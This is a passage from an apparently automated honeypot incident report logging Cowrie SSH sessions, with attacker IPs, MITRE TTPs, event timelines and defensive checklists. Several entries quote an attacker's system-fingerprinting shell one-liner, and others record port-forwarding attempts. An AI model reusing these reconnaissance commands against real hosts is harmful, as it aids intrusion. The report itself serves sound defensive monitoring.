| `2026-08-05 12:59:44` | `cowrie.command.input` |
| `2026-08-05 12:59:44` | `cowrie.log.closed` |
| `2026-08-05 12:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5e270989e4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:01 |
| **Last Seen** | 2026-08-05 13:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:01:11` | `cowrie.session.connect` |
| `2026-08-05 13:01:11` | `cowrie.client.version` |
| `2026-08-05 13:01:11` | `cowrie.client.kex` |
| `2026-08-05 13:01:13` | `cowrie.login.success` |
| `2026-08-05 13:01:15` | `cowrie.session.params` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.success` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.command.input` |
| `2026-08-05 13:01:15` | `cowrie.log.closed` |
| `2026-08-05 13:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5659402e5cf0

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-05 13:02 |
| **Last Seen** | 2026-08-05 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:02:14` | `cowrie.session.connect` |
| `2026-08-05 13:02:14` | `cowrie.client.version` |
| `2026-08-05 13:02:14` | `cowrie.client.kex` |
| `2026-08-05 13:02:14` | `cowrie.login.success` |
| `2026-08-05 13:02:14` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:02:15` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31d911d1a679

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:02 |
| **Last Seen** | 2026-08-05 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:02:40` | `cowrie.session.connect` |
| `2026-08-05 13:02:40` | `cowrie.client.version` |
| `2026-08-05 13:02:40` | `cowrie.client.kex` |
| `2026-08-05 13:02:41` | `cowrie.login.success` |
| `2026-08-05 13:02:42` | `cowrie.session.params` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.success` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:42` | `cowrie.command.input` |
| `2026-08-05 13:02:43` | `cowrie.log.closed` |
| `2026-08-05 13:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9538f16b96

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 13:03 |
| **Last Seen** | 2026-08-05 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:03:59` | `cowrie.session.connect` |
| `2026-08-05 13:03:59` | `cowrie.client.version` |
| `2026-08-05 13:03:59` | `cowrie.client.kex` |
| `2026-08-05 13:04:00` | `cowrie.login.success` |
| `2026-08-05 13:04:00` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:04:00` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade1a80503ee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:04 |
| **Last Seen** | 2026-08-05 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:04:08` | `cowrie.session.connect` |
| `2026-08-05 13:04:08` | `cowrie.client.version` |
| `2026-08-05 13:04:08` | `cowrie.client.kex` |
| `2026-08-05 13:04:08` | `cowrie.login.success` |
| `2026-08-05 13:04:09` | `cowrie.session.params` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.success` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.command.input` |
| `2026-08-05 13:04:09` | `cowrie.log.closed` |
| `2026-08-05 13:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82fc799fb051

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:05 |
| **Last Seen** | 2026-08-05 13:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:05:32` | `cowrie.session.connect` |
| `2026-08-05 13:05:32` | `cowrie.client.version` |
| `2026-08-05 13:05:32` | `cowrie.client.kex` |
| `2026-08-05 13:05:32` | `cowrie.login.success` |
| `2026-08-05 13:05:33` | `cowrie.session.params` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.success` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.command.input` |
| `2026-08-05 13:05:33` | `cowrie.log.closed` |
| `2026-08-05 13:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aefef6d16406

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:06 |
| **Last Seen** | 2026-08-05 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:06:55` | `cowrie.session.connect` |
| `2026-08-05 13:06:55` | `cowrie.client.version` |
| `2026-08-05 13:06:55` | `cowrie.client.kex` |
| `2026-08-05 13:06:55` | `cowrie.login.success` |
| `2026-08-05 13:06:56` | `cowrie.session.params` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.success` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.command.input` |
| `2026-08-05 13:06:56` | `cowrie.log.closed` |
| `2026-08-05 13:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b618c64a58

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]2` |
| **First Seen** | 2026-08-05 13:08 |
| **Last Seen** | 2026-08-05 13:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:08:09` | `cowrie.session.connect` |
| `2026-08-05 13:08:10` | `cowrie.client.version` |
| `2026-08-05 13:08:10` | `cowrie.client.kex` |
| `2026-08-05 13:08:12` | `cowrie.login.success` |
| `2026-08-05 13:08:13` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]2` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30764c53f7f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:08 |
| **Last Seen** | 2026-08-05 13:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:08:22` | `cowrie.session.connect` |
| `2026-08-05 13:08:22` | `cowrie.client.version` |
| `2026-08-05 13:08:22` | `cowrie.client.kex` |
| `2026-08-05 13:08:23` | `cowrie.login.success` |
| `2026-08-05 13:08:24` | `cowrie.session.params` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.success` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.command.input` |
| `2026-08-05 13:08:24` | `cowrie.log.closed` |
| `2026-08-05 13:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44eb60785df9

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-08-05 13:08 |
| **Last Seen** | 2026-08-05 13:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:08:22` | `cowrie.session.connect` |
| `2026-08-05 13:08:22` | `cowrie.client.version` |
| `2026-08-05 13:08:22` | `cowrie.client.kex` |
| `2026-08-05 13:08:24` | `cowrie.login.success` |
| `2026-08-05 13:08:24` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64fa9ea767b

| Field | Detail |
|---|---|
| **Source IP** | `103.230.176[.]152` |
| **First Seen** | 2026-08-05 13:09 |
| **Last Seen** | 2026-08-05 13:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:09:12` | `cowrie.session.connect` |
| `2026-08-05 13:09:12` | `cowrie.client.version` |
| `2026-08-05 13:09:12` | `cowrie.client.kex` |
| `2026-08-05 13:09:15` | `cowrie.login.success` |
| `2026-08-05 13:09:15` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.230.176[.]152` to AbuseIPDB if not already reported
- [ ] Block `103.230.176[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e62edae533f2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:09 |
| **Last Seen** | 2026-08-05 13:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:09:52` | `cowrie.session.connect` |
| `2026-08-05 13:09:52` | `cowrie.client.version` |
| `2026-08-05 13:09:52` | `cowrie.client.kex` |
| `2026-08-05 13:09:52` | `cowrie.login.success` |
| `2026-08-05 13:09:53` | `cowrie.session.params` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.success` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.command.input` |
| `2026-08-05 13:09:53` | `cowrie.log.closed` |
| `2026-08-05 13:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8a73cfe969e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:11 |
| **Last Seen** | 2026-08-05 13:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:11:20` | `cowrie.session.connect` |
| `2026-08-05 13:11:20` | `cowrie.client.version` |
| `2026-08-05 13:11:21` | `cowrie.client.kex` |
| `2026-08-05 13:11:21` | `cowrie.login.success` |
| `2026-08-05 13:11:22` | `cowrie.session.params` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.success` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.command.input` |
| `2026-08-05 13:11:22` | `cowrie.log.closed` |
| `2026-08-05 13:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8963d72345a5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:12 |
| **Last Seen** | 2026-08-05 13:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:12:49` | `cowrie.session.connect` |
| `2026-08-05 13:12:49` | `cowrie.client.version` |
| `2026-08-05 13:12:49` | `cowrie.client.kex` |
| `2026-08-05 13:12:50` | `cowrie.login.success` |
| `2026-08-05 13:12:51` | `cowrie.session.params` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.success` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.command.input` |
| `2026-08-05 13:12:51` | `cowrie.log.closed` |
| `2026-08-05 13:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6414a052e4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:14 |
| **Last Seen** | 2026-08-05 13:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
